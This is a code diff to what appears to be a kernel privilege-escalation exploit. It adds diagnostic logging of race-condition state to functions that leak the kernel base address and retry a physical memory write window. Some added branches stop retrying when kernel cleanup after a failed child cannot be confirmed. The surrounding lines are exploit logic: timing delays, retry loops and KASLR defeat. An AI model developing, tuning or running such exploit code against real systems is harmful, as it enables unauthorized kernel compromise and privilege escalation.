@@ -1,4 +1,5 @@
 #include "common.h"
+#include "czg3_diag.h"
 
 #include <netinet/in.h>
 #if defined(SLIDE_STACK_WRITER) && \
@@ -2212,13 +2213,33 @@ static int slide_trigger_physical_slot(size_t slot) {
     slide_route_syscall_pad = 0;
     snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
     SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
+#if defined(APP_CZG3_DIAGNOSTICS) && APP_CZG3_DIAGNOSTICS
+    char race_state[192];
+    snprintf(race_state, sizeof(race_state),
+             "slot=%zu,delay_us=%d,nfds=%d,pad=%d,waiter_ready=%d,waiter_waiting=%d,owner_started=%d,consumer_ready=%d",
+             slot, delay, slide_route_nfds, slide_route_syscall_pad,
+             atomic_load(&slide_waiter_ready), atomic_load(&slide_waiter_waiting),
+             atomic_load(&slide_owner_started), atomic_load(&slide_consumer_ready));
+    czg3_diag_event("PHYSICAL_RACE_ENTER", attempt, CZG3_SUCCESS, 0,
+                    race_state);
+#endif
     if (slide_trigger_physical_state()) {
       pr_info("p0 physical slot=%zu write attempt=%d/%d delay=%d nfds=%d "
               "pad=%d\n",
               slot, attempt, attempts, delay, slide_route_nfds,
               slide_route_syscall_pad);
+#if defined(APP_CZG3_DIAGNOSTICS) && APP_CZG3_DIAGNOSTICS
+      czg3_diag_event("PHYSICAL_RACE_RESULT", attempt, CZG3_SUCCESS, 1,
+                      race_state);
+#endif
       return 1;
     }
+#if defined(APP_CZG3_DIAGNOSTICS) && APP_CZG3_DIAGNOSTICS
+    /* The route cannot prove PI-tree restoration after a failed child. */
+    czg3_diag_event("PHYSICAL_RACE_RESULT", attempt,
+                    CZG3_RACE_STATE_UNCERTAIN, 0, race_state);
+    break;
+#endif
   }
 
   pr_error("p0 physical slot=%zu write window failed after %d attempt(s)\n",
@@ -2943,6 +2964,15 @@ int slide_leak_kernel_base(void) {
   }
 #endif
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
+#if defined(APP_CZG3_DIAGNOSTICS) && APP_CZG3_DIAGNOSTICS
+    char diag_state[192];
+    snprintf(diag_state, sizeof(diag_state),
+             "p0=%s,waiter_ready=%d,waiter_waiting=%d,owner_started=%d,consumer_ready=%d,pselect=route_marker",
+             slide_p0_session_fresh ? "new" : "unknown",
+             atomic_load(&slide_waiter_ready), atomic_load(&slide_waiter_waiting),
+             atomic_load(&slide_owner_started), atomic_load(&slide_consumer_ready));
+    czg3_diag_event("P0_RACE_ATTEMPT", attempt, CZG3_SUCCESS, 0, diag_state);
+#endif
     if (forced) {
       slide_p0_offset = forced_offset;
     } else {
@@ -3009,6 +3039,13 @@ int slide_leak_kernel_base(void) {
         WEXITSTATUS(status) != 0 || !stext) {
       pr_warning("slide attempt %d failed n=%zd status=%d\n",
                  attempt, n, status);
+#if defined(APP_CZG3_DIAGNOSTICS) && APP_CZG3_DIAGNOSTICS
+      /* A child exit does not prove that a kernel PI waiter was removed. */
+      czg3_diag_event("P0_RACE_RESULT", attempt,
+                      CZG3_RACE_STATE_UNCERTAIN, 0,
+                      "child_failed,kernel_cleanup_unproven");
+      break;
+#endif
       continue;
     }
 
